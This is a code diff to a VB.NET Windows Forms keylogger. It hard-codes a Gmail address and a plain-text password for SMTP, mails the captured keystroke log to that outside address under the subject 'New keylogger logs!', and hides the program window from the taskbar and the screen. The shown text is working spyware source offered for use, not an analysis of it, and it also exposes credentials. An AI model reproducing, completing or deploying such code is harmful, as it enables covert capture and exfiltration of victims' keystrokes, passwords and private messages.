@@ -7,12 +7,12 @@ Public Class Form1
             Dim smtpserver As New SmtpClient
             smtpserver.EnableSsl = True
             Dim mail As New MailMessage
-            smtpserver.Credentials = New Net.NetworkCredential("email", "password")
+            smtpserver.Credentials = New Net.NetworkCredential("thepsnappz@gmail.com", "123123qwerty")
             smtpserver.Port = 587
-            smtpserver.Host = "smtp.live.com"
+            smtpserver.Host = "smtp.gmail.com"
             mail = New MailMessage
-            mail.From = New MailAddress("email")
-            mail.To.Add("email")
+            mail.From = New MailAddress("thepsnappz@gmail.com")
+            mail.To.Add("thepsnappz@gmail.com")
             mail.Subject = ("New keylogger logs!")
             mail.Body = txtLogs.Text
             smtpserver.Send(mail)
@@ -55,6 +55,7 @@ Public Class Form1
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.ShowInTaskbar = False
+        Me.AllowTransparency = True
         Me.ShowIcon = False
         Me.Visible = False
         txtLogs.Text = "keylogger started at: " & Now & vbNewLine
@@ -66,4 +67,3 @@ Public Class Form1
 
     End Sub
 End Class
-'Testing the codes
